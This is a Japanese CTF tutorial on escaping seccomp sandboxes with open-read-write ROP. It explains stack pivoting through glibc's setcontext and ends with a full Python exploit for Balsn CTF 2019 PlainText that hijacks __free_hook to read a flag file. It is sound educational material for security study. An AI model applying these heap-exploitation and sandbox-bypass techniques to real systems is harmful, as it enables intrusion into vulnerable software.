# C サンドボックス脱出
## orw

pwn の問題では、難易度を上げるために、[seccomp](https://en.wikipedia.org/wiki/Seccomp) のような関数でシステムコールの一部を禁止することがあります。多くの場合 execve などのシステムコールが禁止されるため、shell の取得はほぼ不可能です。しかし pwn の問題の目的は flag なので、orw(open-read-write)の方法で flag を読み出すことができます。スタック上の orw は通常の ROP とほとんど違いがないため、ここでは主にヒープ利用におけるホワイトリストの回避について述べます。

一般に、ホワイトリストが有効なヒープ利用系の問題では、__free_hook などのフック関数や GOT をハイジャックした後に orw を実現することを考えます。このとき注入できる gadget は 1 つだけなので、その gadget でスタックピボット(栈迁移)を実現したいところです。比較的汎用的な方法として setcontext 関数を利用する手があり、libc-2.29 では次のように実装されています。

```
.text:0000000000055E00 ; __unwind {
.text:0000000000055E00                 push    rdi
.text:0000000000055E01                 lea     rsi, [rdi+128h] ; nset
.text:0000000000055E08                 xor     edx, edx        ; oset
.text:0000000000055E0A                 mov     edi, 2          ; how
.text:0000000000055E0F                 mov     r10d, 8         ; sigsetsize
.text:0000000000055E15                 mov     eax, 0Eh
.text:0000000000055E1A                 syscall                 ; LINUX - sys_rt_sigprocmask
.text:0000000000055E1C                 pop     rdx
.text:0000000000055E1D                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:0000000000055E23                 jnb     short loc_55E80
.text:0000000000055E25                 mov     rcx, [rdx+0E0h]
.text:0000000000055E2C                 fldenv  byte ptr [rcx]
.text:0000000000055E2E                 ldmxcsr dword ptr [rdx+1C0h]
.text:0000000000055E35                 mov     rsp, [rdx+0A0h]
.text:0000000000055E3C                 mov     rbx, [rdx+80h]
.text:0000000000055E43                 mov     rbp, [rdx+78h]
.text:0000000000055E47                 mov     r12, [rdx+48h]
.text:0000000000055E4B                 mov     r13, [rdx+50h]
.text:0000000000055E4F                 mov     r14, [rdx+58h]
.text:0000000000055E53                 mov     r15, [rdx+60h]
.text:0000000000055E57                 mov     rcx, [rdx+0A8h]
.text:0000000000055E5E                 push    rcx
.text:0000000000055E5F                 mov     rsi, [rdx+70h]
.text:0000000000055E63                 mov     rdi, [rdx+68h]
.text:0000000000055E67                 mov     rcx, [rdx+98h]
.text:0000000000055E6E                 mov     r8, [rdx+28h]
.text:0000000000055E72                 mov     r9, [rdx+30h]
.text:0000000000055E76                 mov     rdx, [rdx+88h]
.text:0000000000055E76 ; } // starts at 55E00
```

もちろん他のバージョンでも大同小異で、この関数の中に rsp への代入があることがわかります。rdx を制御できれば rsp を制御でき、スタックピボットを実現できます。

### 例題
#### Balsn_CTF_2019-PlainText
##### 分析
orw より前の部分の攻略はここでは省略します。この問題の分析は、「Glibc Heap 利用」ディレクトリの「ヒープにおける Off-By-One」を参照してください。

厄介なことに、libc-2.29 では free 関数が rdi を rdx に代入しなくなったため、rdx を直接制御できず、制御できるのは rdi だけです。幸い、偶然にも本問の libc には次のような gadget があります。

```
0x12be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;
```

この gadget で rdx を変更してから setcontext に ret すれば、ROP を実行できます(この gadget は ROPgadget では見つからないため、ropper を使う必要があります)。
##### exploit
ここでは payload のみを示します。
```python
## alloc to __free_hook ##
magic_gadget = libc_base + 0x12be97
add(0x28,p64(magic_gadget)) # 73

pop_rdi_ret = libc_base + 0x26542
pop_rsi_ret = libc_base + 0x26f9e
pop_rdx_ret = libc_base + 0x12bda6
syscall_ret = libc_base + 0xcf6c5
pop_rax_ret = libc_base + 0x47cf8
ret = libc_base + 0xc18ff

payload_addr = heap_base + 0x270
str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
rw_addr = heap_base 

payload = p64(libc_base + 0x55E35) # rax
payload += p64(payload_addr - 0xA0 + 0x10) # rdx
payload += p64(payload_addr + 0x28)
payload += p64(ret)
payload += ''.ljust(0x8,'\x00')

rop_chain = ''
rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["read"])
rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["write"])

payload += rop_chain
payload += './flag\x00'
add(len(payload) + 0x10,payload) # 74
#gdb.attach(proc.pidof(sh)[0])
delete(74)

sh.interactive()
```
